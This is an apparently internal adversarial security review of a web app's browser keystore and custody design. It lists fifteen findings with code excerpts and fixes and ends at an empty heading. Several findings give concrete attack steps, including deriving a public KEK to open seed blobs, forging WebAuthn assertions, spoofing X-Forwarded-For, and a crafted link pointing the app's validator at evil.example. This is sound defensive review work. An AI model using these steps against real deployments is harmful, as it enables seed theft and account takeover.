# attack-custody-1 — adversarial review of the browser keystore pass (reviewer 1)

Written from the code at `7dbfb61`.

Reviewer 1, fresh context, read-only (no servers, no suites run). Sources read in the
brief's order: `docs/custody-model.md`, `notes/reports/REPORT-CUSTODY.md`, `SECURITY-POSTURE.md` §16
and §8, `research/VERIFY-YOURSELF.md` (which carries nothing for this pass — its newest
additions are the multi-FID F21–F24), then `git diff e177b65..HEAD` and the files named.

## Verdict

The one rule — *the server never holds a root, a seed, a vault key or a persona private
key* — is, as an architectural statement about where code runs, delivered: the hierarchy
moved into the browser whole, the keystore door refuses a production server for both
reads and writes (`lib/identity/keystore.ts:102-108`, called from `load()` **and**
`persist()`), the validator is genuinely per-anchor, every state namespace is one opaque
sealed record, and the 120-odd needles the suites grep for really are absent from the
server-side haystacks. But the rule is stated over *key material in transit*, and this
pass's new surfaces break it in a way no needle grep can see: the wrapped seed is served
publicly by the validator while its KEK is a **public function of the method id**,
because `providerAdapter()` returns the deterministic fixture in a public deployment and
`.env.production.example` says to ship it that way — so every root saved by the social
path is recoverable by a stranger with one GET and one SHA-256, and because the save
button passes no subject, the first social saver's root is handed to the second visitor
who clicks "Unlock with social login". Cross-context isolation is sound where the
envelope carries it (anchor resolution, state scoping, counters) and unsound where the
pass added new writers: `POST /device/register` accepts a device's **public** key as
proof that the device is moving, so anyone who learns a registered `(deviceId,
devicePubKey)` pair can relocate that device into their own tenant; the root-link relay
stores both anchors, both root ids and both persona rosters in cleartext in one row and
serves it to any unauthenticated caller who holds the code, which is exactly what
D-CU-0-14 and §16 say the validator never learns; and the co-signature does not cover
the persona sets it transports, so an operator can rewrite them freely. Two of Gate 4's
three new defences are weaker than recorded: the rate limiter keys on a client-supplied
header, and the boot contract has only a must-not-ship half, so a deployment that forgets
`LAYERS_REQUIRE_SIG=true` prints "production environment contract: clean" and then serves
every visitor's state to every other visitor. Finally the shipped device bundle exports
`needles()` / `rootOnly()` / `custody.secrets()` — a one-call seed read for any script on
the app's origin — and `public/device/smoke.html`, a rig harness, ships in `public/` and
takes its validator URL from the query string. Fifteen findings below; the fixture-provider
one is the pass-stopper.

---

## Findings

### 1. CRITICAL — the fixture custody provider is the production social-login path, and its KEK is public

**Where.** `lib/device/custody/provider.ts:28-42`, `lib/device/custody/wrap.ts:104-107`,
`lib/device/custody/index.ts:167-198`, `validator/custody.js:41-52`,
`app/device/page.tsx:24`, `.env.production.example:36`,
`components/device/DeviceApp.tsx:130-134` and `:260-271`.

The fixture's export is a hash of public inputs:

```js
// lib/device/custody/provider.ts:31-35
  async login(method, hint) {
    const subject = (hint && hint.trim()) || "fixture-user";
    return { subject, exported: sha256Bytes(te.encode("layers-fixture-provider|" + method + "|" + subject)) };
  },
```

and it is the adapter a public deployment gets, unconditionally — there is no
`ZK_DEV_HOOKS` gate anywhere on this path:

```js
// lib/device/custody/provider.ts:38-41
export function providerAdapter(): CustodyProviderAdapter {
  const which = (process.env.CUSTODY_PROVIDER || "fixture").toLowerCase();
  if (which === "fixture") return fixtureProvider;
```

The device bundle's `process.env` is whatever the page declared (`lib/device/shims/process.ts:8-9`),
and the page declares `CUSTODY_PROVIDER: process.env.CUSTODY_PROVIDER || "fixture"`
(`app/device/page.tsx:24`); the production template names the same value. The KEK is a
salt-free HKDF of that export (`wrap.ts:104-107`, `hkdfSha256(exported, NONE,
"layers/v1/kek-from-provider", 32)`), the blob is pushed to the validator unconditionally
on the provider path (`index.ts:177  await putBlob(methodId, blob);`), and the blob read is
public by design:

```js
// validator/custody.js:42-52
  app.get("/custody/blob/:id", (req, res) => {
    const row = db.prepare("SELECT blob, updated_at FROM custody_blobs WHERE method_id = ?").get(req.params.id);
```

**What an attacker does.** (a) `GET /custody/blob/pv:fixture:email:<subject>`, compute
`HKDF(SHA-256("layers-fixture-provider|email|<subject>"), "", "layers/v1/kek-from-provider", 32)`,
`aesGcmOpen` with AAD `"layers/custody/v1|pv:fixture:email:<subject>"`. No login, no
authentication, no rate-limit-relevant volume. (b) Easier: the save card passes no subject
(`saveProvider(m)` with `providerHint` empty — the hint input exists only on the *unlock*
card, `DeviceApp.tsx:290`), so the first visitor to press "Save with Google" owns
`pv:fixture:google:fixture-user`; any later visitor who presses "Unlock with social login"
with the box empty resolves that record, derives the same KEK, fetches the same blob and
`installSeed`s it.

**What they get.** The 32-byte seed → the vault key, every persona signing key, the
Farcaster signer and custody keys, the zk identity and every nullifier secret, the
device-auth key (so they can mint personas, authorise devices, export the 24 words). Total
custody break of every account saved through the social path, and in case (b) a one-click
silent takeover from the product's own UI.

**Why the suites pass anyway.** `scripts/accept-cu2.mjs:259-264` greps the validator DB and
the logs for the KEK and the provider export. Both are absent from those haystacks — and
both are *derivable from a value that is present*, the method id. The grep is testing the
wrong property: it asserts the secret was not stored, not that the secret is unguessable.

**Smallest fix.** Refuse the fixture as a save path outside the rig: in
`providerAdapter()`, return `fixtureProvider` only when `process.env.ZK_DEV_HOOKS === "true"`,
otherwise throw ("no custody provider is installed in this build"), and delete the
`"fixture-user"` default subject so a fixture login without a subject cannot resolve at
all. Then remove `CUSTODY_PROVIDER=fixture` from `.env.production.example` and hide the
social card when `status.providerMethods` is empty.

---

### 2. HIGH — `POST /device/register` accepts a device's PUBLIC key as proof that the device is moving

**Where.** `validator/server.js:328-370`, decisive line 360:

```js
    if (prior && prior.anchor && prior.anchor !== anchor.pubkey && prior.pubkey !== delegation.devicePubKey)
      return res.status(403).json({ error: "device id is registered to another key under another device-auth anchor" });
```

The route is unauthenticated (no envelope, no `STRICT` gate). The resolved `anchor` is any
anchor the supplied delegation verifies under — and `POST /device/auth-anchor` lets anyone
register their own. D-CU-1-A-DEVICE-MAY-MOVE-ITS-OWN-ID intends "a device may re-anchor
itself", but the guard's escape clause tests `prior.pubkey === delegation.devicePubKey`,
i.e. possession of a **public** value, while the delegation is signed by the *attacker's*
anchor. Nothing proves the device consented.

**What an attacker does.** Register an anchor `A_att`. Sign a delegation for
`{deviceId: <victim's>, devicePubKey: <victim's device pubkey>}` with `A_att`. POST it. The
upsert at 365-368 rewrites the victim's row with `anchor = A_att`. The victim's envelopes
still verify (`checkEnvelope` checks the stored delegation against the stored anchor, and
the envelope signature against `dev.pubkey`, which is unchanged) and `req.layersAnchor =
dev.anchor` (line 451) now names the attacker.

**What they get.** Every subsequent read that victim's device makes returns the attacker's
namespaces; every write it makes lands under the attacker's anchor, where
`DELETE /state` (also the attacker's) destroys it; the victim's own prior state becomes
unreachable and `POST /roots` for their fid 403s, so the device is bricked. The written
rows stay sealed under the victim's vault key, so this is a cross-tenant **write redirect
plus destruction**, not a plaintext read — but it is one browser context writing into
another's tenant, which §16 says cannot happen. Disclosure of the pair is cheap: the link
relay publishes `deviceId` and `devicePubKey` to any caller with a code
(`validator/custody.js:147-160`).

**Smallest fix.** Refuse any anchor change unless the request carries a valid envelope for
that device id (`checkEnvelope(req, "devices", bodyHash)` before the upsert) — possession
of the private key, not the public one. A first registration of an unknown id is
unaffected.

---

### 3. HIGH — the wrap-path release route accepts a caller-supplied public key, and its origin/RP checks are caller-chosen

**Where.** `app/api/custody/passkey/release/route.ts:30-49`, `lib/custody/release.ts:140-157`.

```ts
  } catch {
    /* the validator is unreachable: fall through to first-use only if nothing is recorded — refused below otherwise */
  }
  if (!key) {
    if (typeof spkiHex !== "string" || !/^[0-9a-f]{40,400}$/.test(spkiHex) || (alg !== -8 && alg !== -7))
      return NextResponse.json({ error: "no recorded key for this credential and none supplied" }, { status: 404 });
    key = { spkiHex, alg };
  }
```

The comment claims the unreachable-validator case is "refused below"; it is not. A `catch`
and a non-2xx are indistinguishable from "no record", and both land on the caller's own
`spkiHex`. The two protocol binds are likewise caller-chosen: `rpIdFor(req.headers.get("origin"))`
takes the RP id from the request's own `Origin` header (falling back to `"localhost"` when
absent), and `allowedOrigins()` unconditionally adds `http://localhost:<port>` and
`http://127.0.0.1:<port>` even in production (`release.ts:144-146`).

**What an attacker does.** `POST /api/custody/passkey/challenge` (unauthenticated), mint
their own Ed25519 keypair, forge `authenticatorData` with `SHA-256("localhost")` and the
UP flag, forge `clientDataJSON` with `type: "webauthn.get"`, the issued challenge and
`origin: "http://localhost:3001"`, sign, and POST to `/release` with
`credentialId: <victim's>` and their own `spkiHex`. Whenever the validator lookup does not
return a record — an outage, a restart, a 5xx, a slow response, or simply a credential id
whose record has not been written yet — the release succeeds.

**What they get.** `HMAC(CUSTODY_RELEASE_SECRET, "layers/custody/release/v1|" + credentialId)`,
the wrap-path KEK for that credential. Opening the seed still needs the browser-held blob,
so this does not by itself break a wrap-path account — but it collapses
`A-CU-WRAP-PATH-SPLIT` from "an operator holding the release key **and** a copy of the
blob" to "anyone at all holding a copy of the blob", and it makes §16's "Trusts the server
not to release without an assertion" false: an assertion is verified, against a key the
requester chose.

**Smallest fix.** Distinguish the three cases: on a validator 404 accept the supplied key
(the intended TOFU), on any other status or a thrown fetch return 503 and release nothing.
Pin `rpId` to a configured host (`new URL(process.env.APP_URL).hostname`) rather than the
request header, and add the localhost origins only when `ZK_DEV_HOOKS === "true"`.

---

### 4. HIGH — the root-link relay stores both roots and both persona rosters in cleartext, and the co-signature does not cover them

**Where.** `validator/custody.js:209-232`, `validator/migrations.js` v19
(`root_link_offers(code, anchor_a, proposal, anchor_b, answer, sig_a, …)`),
`lib/device/rootlink.ts:46-51`, `:110`, `:135`, `:161`.

`personasOk` admits up to 64 `{id, handle, …}` objects per side (`custody.js:209`), the
proposal and the answer are stored as JSON text next to `anchor_a` and `anchor_b` in one
row, and the read is unauthenticated:

```js
  app.get("/rootlink/:code", (req, res) => {
    ...
    res.json({ code: row.code, proposal: JSON.parse(row.proposal), answer: row.answer ? JSON.parse(row.answer) : null, sigA: row.sig_a, expiresAt: row.expires_at });
```

Meanwhile the thing both roots sign covers neither roster:

```ts
// lib/device/rootlink.ts:46-48
export function grantCanonical(g: Pick<RootLinkGrant, "a" | "b" | "rootA" | "rootB" | "issuedAt">): string {
  return `layers/rootlink/v1|${g.a}|${g.b}|${g.rootA}|${g.rootB}|${g.issuedAt}`;
}
```

**What an attacker does.** (i) As the **operator**, read the row: it is the one artefact
that names two roots as one person, with both persona sets in the clear — persona → anchor
in one hop, which is the precise join D-CU-1-EVERY-NAMESPACE-IS-SEALED was introduced to
prevent "in two hops". (ii) As a **stranger who learns a code** (it is typed or read aloud
between two humans), `GET /rootlink/<code>`: both anchors, both root ids, both rosters.
They can also `PUT /rootlink/<code>/answer` first with their own root — `answer()` and
`complete()` verify only that the signature matches the anchor that *claims* to be the
counterparty (`rootlink.ts:159`), never that it is the counterparty the human intended — so
the victim ends up co-signing a grant with the attacker and presenting the attacker's
personas in their own switcher, while the real partner gets 409 "already answered". (iii)
As the operator again, rewrite `proposal.personasA` / `answer.personasB` to anything: both
signatures still verify, so each client presents operator-chosen handles, names and avatar
URLs under "these accounts are linked".

**What they get.** The linkage §16 says the validator "learns nothing it did not already
hold", both persona rosters in plaintext, and an impersonation slot inside the victim's UI.

**Smallest fix.** Two lines of contract. Include a digest of the canonicalised persona
lists in `grantCanonical` (`|${sha256(JSON.stringify(personasA))}|${sha256(JSON.stringify(personasB))}`),
and stop relaying the rosters in the clear: carry only the anchors and root ids through the
relay and HPKE-seal the roster to the counterparty the way device linking already does, or
have each side fetch the other's public persona records from the directory by the anchors
it now knows.

---

### 5. HIGH — the boot contract has no must-BE-SET half, so a public deployment can ship unarmed and call itself clean

**Where.** `lib/platform/env-contract.ts:7-38`, `validator/env-contract.js:4-41`,
`validator/server.js:24-32`, `validator/db.js:53-59`, `.env.production.example:40`.

`MUST_NOT_SHIP` is a list of names that must be absent. Nothing asserts that
`LAYERS_REQUIRE_SIG=true` is present, and the whole production posture hangs on it:

```js
// validator/server.js:24-31
const REQUIRE_SIG = process.env.LAYERS_REQUIRE_SIG === "true";
const DEV_HOOKS = process.env.ZK_DEV_HOOKS === "true";
const STRICT = REQUIRE_SIG && !DEV_HOOKS;
```

With `REQUIRE_SIG` false, `GET /state`, `GET /state/:ns`, `PUT /state/:ns` and
`DELETE /state` skip `checkEnvelope` entirely and resolve their tenant through
`anchorOf(req, db)` → `singleAnchor(db)` → "the oldest registered anchor". `.env.production.example`
documents the variable; `instrumentation.ts` and the validator's boot check both print
"production environment contract: clean" without it.

**What an attacker does.** Nothing — they just read. `GET /state` returns the
first-registered root's every namespace; `PUT /state/<ns>` overwrites it; `DELETE /state`
wipes it.

**What they get.** Every visitor's sealed corpus collapses onto one tenant, and the
readiness audit's findings 1 and 2 are un-closed, silently, by an omitted environment
variable.

**Smallest fix.** Add a `MUST_BE_TRUE = ["LAYERS_REQUIRE_SIG"]` to both copies of the
contract and exit 78 naming it when `isPublicDeployment()` and the value is not `"true"`.
`scripts/accept-cu4.mjs` checks 7 and 8 only exercise the poisoned direction; add the
omitted-variable direction there.

---

### 6. HIGH — both rate limiters key on a client-controlled header, and the anon channel is not limited at all

**Where.** `validator/server.js:110` and `:88-93`; `middleware.ts:34`.

```js
    const key = (req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.ip || req.socket.remoteAddress || "local";
```

The spoofable header is preferred over the socket address, and `app.set("trust proxy", …)`
is never called, so there is no notion of a trusted hop. The app's limiter has the same
exposure from the other side: `req.ip || req.headers.get("x-forwarded-for")…` — on a
self-hosted Next 14 server `NextRequest.ip` is undefined, so the key is the header.
Separately, `mountAnon(app, db)` is mounted at line 90, *before* the limiter middleware at
line 96, so `/anon/*` is exempt; `/health` and `OPTIONS` are exempt by design.

**What an attacker does.** Add `X-Forwarded-For: <counter++>` to each request.

**What they get.** Unbounded request volume against every route — which re-opens every
guess-based surface in this pass (link and root-link codes, method-id enumeration, the
release oracle in finding 3, the `revoked/:id` oracle in finding 12) — plus unbounded
growth of `rlBuckets`/`buckets`, which only evict entries idle for 120 s on a 60 s sweep.
A-CU-4-RATE-LIMIT-PER-INSTANCE says the budget is "per process instance, which is still a
budget"; against a header-spoofing client there is no budget.

**What the suite misses.** `scripts/accept-cu4.mjs:93-111` bursts from one address and
asserts *some* 429s appear. The property "a single client cannot exceed the budget" is
never asserted, so this regression is invisible to it.

**Smallest fix.** Key on `req.socket.remoteAddress` (validator) and on the socket/`x-real-ip`
under an explicit `TRUSTED_PROXY=true` (app); move `mountAnon` below the limiter.

---

### 7. MEDIUM — the shipped device bundle exports the seed on a one-line call

**Where.** `lib/device/entry.ts:21-25`, `:35-36`, `:44-45`, `:112-120`, `:139`;
`scripts/build-device.mjs:26-28` (`sourcemap: false, minify: false`).

```ts
  api.needles = async () => {
    const ks = await import("@/lib/identity/keystore");
    const dk = await import("@/lib/identity/deviceKeys");
    return [...ks.rootMaterialForLeakTest(), ...ks.keyMaterialForLeakTest(), ...dk.deviceKeyMaterialForLeakTest()]…
```

`rootMaterialForLeakTest()[0]` **is the seed hex** (`keystore.ts:181-186`). The same object
also exposes `rootOnly()`, `custody.secrets()` (every KEK, PRF output and provider export)
and `linking.lastPayload()` (the vault key and every persona key leaf as text), on
`globalThis.__layersDevice`, with no gate on `ZK_DEV_HOOKS`, in the bundle a production
deployment serves. The comment on line 22 reads "Never printed, never sent anywhere."

**What an attacker does.** Any script that reaches the app's origin — an XSS, an injected
third-party tag, a malicious extension with host permissions, a page that loads
`/device/device.js` itself (finding 8) — calls
`await window.__layersDevice.needles()` and POSTs the array out.

**What they get.** The seed, in one call, without touching IndexedDB or reimplementing the
unwrap. Browser custody means an XSS is always serious; this turns "serious" into
"trivial", and it is the kind of affordance that will still be there in a year.

**Smallest fix.** Wrap the four debug members in `if (process.env.ZK_DEV_HOOKS === "true")`
at assignment time in `entry.ts`, leaving the stub implementations
(`needles: async () => []`) in a public build. The rig passes its own env through
`__LAYERS_DEVICE_ENV`, so the suites keep working.

---

### 8. MEDIUM — `public/device/smoke.html` ships in production and takes its validator from the query string

**Where.** `public/device/smoke.html:9-30` (tracked: `git ls-files public/device/` returns
`boot.js` and `smoke.html`).

```html
        var q = new URLSearchParams(location.search);
        window.__LAYERS_DEVICE_ENV = {
          NODE_ENV: "production",
          VALIDATOR_URL: q.get("validator") || "http://127.0.0.1:4001",
```

The file is under `public/`, so a public deployment serves it at `/device/smoke.html` on the
app's own origin — the same origin whose IndexedDB holds a saved identity. Nothing validates
the parameter; `ZK_MODE` is caller-settable too.

**What an attacker does.** Send the victim `https://app.example/device/smoke.html?validator=https://evil.example`.
The page boots the device on the app's origin, `openBrowserStorage()` restores the saved
seed out of IndexedDB, and every validator call — anchor registration, device registration,
`loadAll`, every `flush`, and `putBlob` if the visitor then saves — goes to the attacker's
host. Combined with finding 14 the attacker's "validator" can also answer with plaintext
state the device accepts, and with finding 1 a social save posts a blob whose KEK the
attacker already knows.

**What they get.** The victim's anchor and device public keys and delegation, every sealed
namespace with its name, KiB-rounded size and write timing, arbitrary injected state, and
— on the fixture social path — the seed. Also a page on the product's origin that exposes
the whole `__layersDevice` API of finding 7.

**Smallest fix.** Stop shipping it: move the harness out of `public/` (serve it from a
rig-only route, or write it to a temp dir from `scripts/device-smoke.mjs`). Failing that,
refuse to boot unless `location.hostname` is a loopback name, and accept `?validator=`
only for loopback origins.

---

### 9. MEDIUM — provider method ids are squattable, and under the fixture a squatted id installs the squatter's seed

**Where.** `validator/custody.js:63-79` (`ID = /^(pk|pv):[A-Za-z0-9._:-]{1,240}$/`, no
relationship between the id and the caller), `lib/device/custody/index.ts:184-198`.

First-write-wins protects an id you already hold; it does nothing about an id you have not
claimed yet. `unlockProvider` then trusts whatever record it finds:

```ts
  const rec = await getMethod(methodId);
  if (!rec) return { empty: true, methodId, kind: "provider", subject: login.subject };
  …
  const blob = (await getBlob(methodId)) ?? localBlob(methodId);
  …
  const seedHex = unwrapSeed(blob, kek);
  const info = await installSeed(seedHex);
```

Nothing checks `rec.anchor` against anything the visitor expects; `unwrapSeed`'s AAD binds
the blob to the method **id**, not to the anchor that wrote it.

**What an attacker does.** From any browser device (a signed envelope is all
`PUT /custody/method/:id` needs), claim `pv:fixture:email:victim@example.com` and write a
blob wrapping *their own* seed under the publicly derivable KEK for that subject.

**What they get.** (i) Provider-independent: the real owner's `saveProvider` is refused
409 forever — a permanent denial of that save method for a chosen identity, and a
name-squatting surface over every email address and Google subject. (ii) Fixture-specific:
when the victim tries to *unlock*, the KEK matches, the seed unwraps, `installSeed` runs,
and the victim's browser silently adopts the attacker's root — the attacker then holds the
seed for the vault the victim proceeds to fill.

**Smallest fix.** Require proof of the subject before a `pv:` record is accepted (the app
server verifies the provider login and countersigns the method id), and, as the cheap
defence-in-depth the client can do today, have `unlockProvider` refuse a record whose
`kind`/`anchor` does not match the identity being restored and surface "that login belongs
to another account" instead of installing.

---

### 10. MEDIUM — `GET /custody/method/:id` is an unauthenticated subject → root-anchor oracle

**Where.** `validator/custody.js:35-39`.

```js
  app.get("/custody/method/:id", (req, res) => {
    const row = db.prepare("SELECT method_id, kind, anchor, pubkey_spki, alg, created_at FROM custody_methods WHERE method_id = ?").get(req.params.id);
```

Method ids are, by D-CU-2-METHOD-IDS-ARE-PUBLIC-IDENTIFIERS, public identifiers — for the
provider path a provider subject, i.e. in practice an email address or a Google/Farcaster
id. The projection includes `anchor`, the root's device-auth public key.

**What an attacker does.** `GET /custody/method/pv:fixture:email:alice@example.com`.

**What they get.** "Does alice@example.com have a Layers account" plus her root's anchor —
which is the key of every `adapter_state`, `devices` and `roots` row she owns, the input to
`pseudoFid` (so her root row and negative fid), the target for findings 2 and 13, and the
value the root-link relay publishes. §16's "the validator holds … a public identifier
bound to an anchor" is accurate; the *reachability* of that binding by a stranger who knows
only an email address is not recorded anywhere.

**Smallest fix.** Drop `anchor` from this projection. The only consumer that needs more
than `kind` is `app/api/custody/passkey/release`, which needs `pubkey_spki`/`alg` for
`pk:` ids; the device's client (`methods.ts:138-143`) uses `kind` alone. Serve `anchor`
only under the signed `/custody/methods` read, which is already scoped.

---

### 11. MEDIUM — `POST /events` takes an unvalidated `count`, and a seeded root with a NULL anchor is claimable

**Where.** `validator/server.js:235-267`, `validator/rep.js:16-44`, `validator/seed.js:24`.

```js
    const { rootId, type, count = 1, sourceId = null } = req.body || {};
    …
      if (!root.anchor) db.prepare("UPDATE roots SET anchor = ? WHERE id = ?").run(req.layersAnchor, rootId);
    …
      ).run(rootId, type, count, sourceId, hourGrain(Date.now()));
```

`count` is never range-checked, and `scoreForRoot` is `SUM(count) * WEIGHTS[type]`.
`tierForRoot` computes a decile across **all** roots, so one root's score changes every
other root's tier. Separately, `validator/seed.js:24` inserts roots with no `anchor`
column, so every seeded root row has `anchor = NULL`, and the line above lets the first
signed caller claim it.

**What an attacker does.** One signed `POST /events {rootId: <their own>, type:
"follow_gained", count: 1e12}`. Or, knowing a seeded root id, the same call against it —
which both claims the row for their anchor (403ing anyone else thereafter) and inflates it.

**What they get.** Top tier for themselves, the reputation UBI's accrual that follows from
it, the zk For-You tier gate satisfied, and a downward shift in every honest visitor's
decile. `notes/reports/REPORT-CUSTODY.md` records finding 3b's "`POST /events` unsigned (rep inflation)"
as closed; only the *anonymous* half is. Root ids are not enumerable from the validator's
public surface (`/health` returns counts only), which keeps the seeded-root variant at
MEDIUM rather than HIGH.

**Smallest fix.** `if (!Number.isInteger(count) || count < 1 || count > 100) return 400`,
and give `validator/seed.js` an `anchor` for the roots it inserts (or refuse to claim a
NULL anchor at all).

---

### 12. MEDIUM — relay affordances any signed stranger can use: revoke any grant, burn any open offer, probe any grant id

**Where.** `validator/custody.js:273-280`, `:224-227`, `:162-175`, `:177-187`.

```js
  app.post("/rootlink/revoke", (req, res) => {
    const { grantId } = req.body || {};
    if (typeof grantId !== "string" || !/^[0-9a-f]{32}$/.test(grantId)) return res.status(400).json({ error: "grantId required" });
    const anchor = signed(req, res, bodyHash(req));
    if (!anchor) return;
    db.prepare("INSERT OR IGNORE INTO root_link_revocations (grant_id, anchor, created_at) VALUES (?, ?, ?)")…
```

No check that the revoking anchor is a party to the grant — and `grantId` is
`sha256(a|b|rootA|rootB|issuedAt).slice(0,32)` over five values the relay published
(finding 4), so anyone who saw the code can compute it. `GET /rootlink/revoked/:id` is
unauthenticated and answers for any id. `PUT /link/:code/sealed` requires an envelope but
never relates the poster to the offer, and refuses the second write; `DELETE /link/:code`
only checks the anchor when `row.anchor` is already set, so an unanswered offer can be
deleted by any signed caller.

**What an attacker does.** Compute the grant id and revoke it (permanent — nothing sweeps
`root_link_revocations`, and the same pair with the same `issuedAt` can never relink);
or post garbage sealed material to an open link offer so the legitimate old device gets
409 "that offer was already answered" and the new device's HPKE `open` fails; or delete a
pending offer outright.

**What they get.** Persistent denial of root linking and device linking for a chosen pair,
and a public existence oracle over grant ids.

**Smallest fix.** Record `(anchor_a, anchor_b)` for the grant at `complete` time (or require
a signature over `grantCanonical` on the revoke) and refuse a revoke from a non-party; gate
`/rootlink/revoked/:id` behind the envelope and answer only for the caller's own grants;
require the `DELETE /link/:code` caller to be the offering device (it already holds the
device key) when `row.anchor` is null.

---

### 13. MEDIUM — the pseudo-fid is 32 bits of the anchor in a UNIQUE column, and `POST /roots` does not bind it to the caller

**Where.** `lib/device/boot.ts:34-36` and `:71-77`, `validator/server.js:165-194`,
`validator/db.js:12` (`fid INTEGER UNIQUE NOT NULL`).

```ts
export function pseudoFid(anchorPubHex: string): number {
  return -((parseInt(anchorPubHex.slice(0, 8), 16) % 2147483646) + 1);
}
```

`POST /roots` takes `fid` from the body and only checks `Number.isInteger`; it never
relates it to `req.layersAnchor`. A taken fid is a hard 409, and boot then throws:
`if (!rootId) throw new Error("device boot: the validator refused this root")`.

**What an attacker does.** Learn a target's anchor (finding 10, or the root-link relay), then
register a root with `fid = pseudoFid(targetAnchor)` and their own `signerUuid`.

**What they get.** That anchor can never boot a device again — a permanent, targeted denial
tied to an identity, not to an address, so no rate limit helps. Even with no attacker, 32
bits into a unique column means chance collisions at roughly 46,000 visitors, and the
second visitor of a colliding pair simply cannot use the product.

**Smallest fix.** For negative fids, ignore the body and compute
`-(hash(req.layersAnchor) mod …)` on the validator from the envelope's anchor, so the fid
is a function of the caller; and widen it (use more of the anchor, or key the row by the
anchor and drop the fid uniqueness for device roots).

---

### 14. MEDIUM — `unsealAny` returns plaintext for a non-vault namespace, so a hostile validator can inject unauthenticated state

**Where.** `lib/vault/vault.ts:195-202`.

```ts
  if (isVaultNamespace(ns)) return decryptNamespace(ns, stored, key);
  return stored;
```

D-CU-1-EVERY-NAMESPACE-IS-SEALED made writes seal everything, and the report notes
"Hydration accepts all three shapes it can meet" — but accepting the legacy shape on read
means the device has no way to tell "my own sealed record" from "something the server made
up". For a non-vault namespace there is no authentication at all: no tag, no key, no
signature.

**What an attacker does.** Serve `{"some":"value"}` for a non-vault namespace — as the
operator, or as the attacker-chosen "validator" of finding 8.

**What they get.** Arbitrary state inside the visitor's device for every non-vault
namespace, accepted as the visitor's own.

**Smallest fix.** Once a device has written a sealed record for a namespace, refuse an
unsealed shape for it: keep a per-namespace `sealed: true` marker in device storage (it
already has one write path, `flush`) and throw on a plaintext read after that.

---

### 15. LOW — the device host is installed by one page, not by the root layout, so "the API surface is the device's" is narrower than recorded

**Where.** `app/layout.tsx:16-22` (no `DeviceHost`), `components/device/DeviceApp.tsx:96-98`
(the only loader of `/device/boot.js` and `/device/device.js`), `app/device/page.tsx`,
`public/device/smoke.html:30-34`, against `docs/custody-model.md` D-CU-0-3 ("a client
component installed by the root layout (`DeviceHost`) patches `window.fetch`").

`grep -rn "DeviceHost" --include=*.tsx` returns only `lib/device/host.ts` and
`lib/device/entry.ts`. So in production a device exists on `/device` and on the smoke
harness, and nowhere else: `/home` and the other 50 pages still fetch `/api/*` against the
Next server, which has no keystore and answers with the keystore door's throw. The report
names one gap — server-side public-only rendering — and says "the API surface is the
device's, the rendering path is not"; the code says the API surface is the device's *on the
pages that boot a device*. The Gate 1/Gate 4 isolation evidence is correspondingly scoped:
`scripts/audit-preview-g0.mjs:24` drives every request through
`/device/smoke.html`, not through the app's own pages. The property "two visitors of the
app cannot see each other's state" is therefore demonstrated for the harness page and
inferred for the app.

**Smallest fix.** No code change is needed for correctness of what is built — but the
report and §16 should say "the device boots on `/device` and the smoke harness; the app's
pages do not yet install it", so the next pass does not build on a wider claim.

---

### Also noted (LOW / NOTE)

- **`app/api/recovery` accepts a phrase or a passphrase in a POST body on a production app
  server.** `app/api/recovery/route.ts:105-127`. The keystore door throws inside
  `recoverIdentity` before `enrollWithSeed` (`lib/identity/roster.ts:67-75` reads
  `rootMaterialForLeakTest()` first), so no enrolment happens and the phrase is not
  persisted — but `openSeedEscrow(blob, String(body.passphrase))` runs *before* that, and
  its escrow blob is fetched unsigned (`fetch(`${VBASE}/state/seedEscrow`)`, no envelope
  headers). On a validator that is not armed (finding 5) that GET succeeds, the seed
  materialises in the app server's memory, and the status code distinguishes a correct
  passphrase (500, the keystore refusal) from a wrong one (400). `mnemonicToSeed` does not
  echo the phrase in its error, so the 400 body is clean.
- **`storage.browser.wipe()` does not drain the mirror queue** (`lib/platform/storage.browser.ts:163-169`):
  a write enqueued just before a wipe lands in IndexedDB after `FILES` is cleared. The
  wrapping key is gone, so the residue is unreadable rather than a leak — but "forget this
  identity" leaves bytes behind.
- **`rootlink.linked()` treats an unreachable revocation check as "not revoked"**
  (`lib/device/rootlink.ts:177-182`, `catch { revoked = false; }`). Presentation only, but
  it is the shape the never-fail-open rule warns about: a link the other side revoked keeps
  being shown whenever the check fails.
- **`accept()` never verifies the link payload's delegation against its `anchorPubHex`**
  (`lib/device/linking.ts:122-134` checks only that the delegation names this device). The
  material is HPKE-sealed to this device, so only the approver wrote it — but a person who
  entered the wrong code, or was handed one, installs a foreign root with no signature check
  and no confirmation screen.
- **The link code is a bearer credential for the whole vault, travelling in the phishing-friendly
  direction.** `approve()` (`lib/device/linking.ts:74-107`) seals the vault key, the zk master
  and every persona key leaf to whatever HPKE key the code names, immediately, with no
  counterparty fingerprint shown. D-CU-3-THE-CODE-COMES-FROM-THE-NEW-DEVICE records this as a
  *UX* deviation from D-CU-0-13 ("the old device's screen asks for the code rather than showing
  one"); the security consequence — "whoever supplies the code gets the vault" — is not
  recorded. `POST /link/offer` is unauthenticated, so producing a code costs nothing.
- **`app/api/dev/route.ts:26` parses the body before the production guard at `:32`**, so a
  malformed body gets 500 rather than 403. Cosmetic; the closure itself is whole and covers
  GET.

---

## What the suites would not catch (by property)

1. **"A social-path blob cannot be opened by a stranger."** `accept-cu2.mjs:259-264` greps for
   the KEK and the provider export in the DB and the logs. Both are absent and both are
   derivable from the method id, which is present. 99 needles pass while the seed is public.
2. **"The validator never holds a row naming two roots together, nor either root's persona set
   in plaintext."** `accept-cu3.mjs:237` restricts the grep to one table —
   `if (row.t === "adapter_state" && …)` — while the comment above it claims the general
   property; and `answer()` deletes the relay row (`rootlink.ts:140`) before the assertion
   runs, so the row would be gone even without the table filter.
3. **"A single client cannot exceed the rate budget."** `accept-cu4.mjs:93-111` bursts from one
   address and asserts *some* 429s. A varying `X-Forwarded-For` is never sent.
4. **"A public deployment refuses to start unarmed."** `accept-cu4.mjs:137-157` tests only the
   poisoned direction (a must-not-ship name set) and "a clean one starts". An omitted
   `LAYERS_REQUIRE_SIG` is indistinguishable from clean.
5. **"A device id can be re-anchored only by the device itself."** Nothing exercises
   `POST /device/register` with a third party's `devicePubKey` under a fresh anchor.
6. **"The device bundle a visitor downloads exposes no key material."** No suite asserts the
   absence of `needles`/`rootOnly`/`secrets`/`lastPayload` from a production build — they are
   the instruments the suites depend on, so a check would have to run against a
   `ZK_DEV_HOOKS`-off bundle.
7. **"Only the app's own pages are served."** No suite asserts that `/device/smoke.html` 404s
   on a public deployment.

---

## Checked and holding (do not re-derive)

